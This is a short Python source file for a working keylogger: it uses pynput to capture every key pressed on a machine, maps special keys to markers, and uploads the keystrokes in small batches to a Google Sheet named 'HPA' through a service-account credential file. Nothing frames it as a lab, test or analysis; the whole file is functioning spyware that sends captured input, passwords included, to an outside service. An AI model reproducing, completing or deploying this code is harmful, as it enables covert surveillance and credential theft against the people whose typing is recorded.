import pynput
import gspread
from oauth2client.service_account import ServiceAccountCredentials
from datetime import datetime

from pynput.keyboard import Key, Listener

scope = ['https://spreadsheets.google.com/feeds', 'https://www.googleapis.com/auth/drive']
creds = ServiceAccountCredentials.from_json_keyfile_name('sheets.json', scope)
client = gspread.authorize(creds)

sheet = client.open('HPA').sheet1

current_cell = 2

for celli in range(1, 28):
    if sheet.cell(1, celli).value == '':
        current_row = celli
        break

    if celli == 27:
        quit()

sheet.update_cell(1, current_row, f'Last Updated: {str(datetime.now())}')

keys = []

def on_press(key):
    global keys

    keys.append(key)
    if len(keys) > 8:
        write_out()
        keys = []


def filter_spaces(character):
    if character == Key.space:
        return ' '

    elif character == Key.enter:
        return '|Enter|'

    elif character == Key.shift or character == Key.shift_r:
        return '|Shift|'

    elif character == Key.backspace:
        return '|B|'

    elif character in (Key.left, Key.right, Key.up, Key.down, Key.tab, Key.alt_r, Key.alt_l, Key.ctrl_l, Key.ctrl_r, Key.num_lock, Key.caps_lock):
        return ''

    else:
        return character


def write_out():
    global keys, current_cell, current_row

    sheet.update_cell(1, current_row, f'Last Updated: {str(datetime.now())}')

    keys = list(map(filter_spaces, keys))
    keys = list(map(str, keys))
    
    output = ''.join(keys).replace('\'', '')

    sheet.update_cell(current_cell, current_row, output)
    current_cell += 1


def on_release(key):
    global keys
    if key == Key.shift or key == Key.shift_r:
        keys.append('|EndShift|')

with Listener(on_press = on_press, on_release = on_release) as listener:
    listener.join()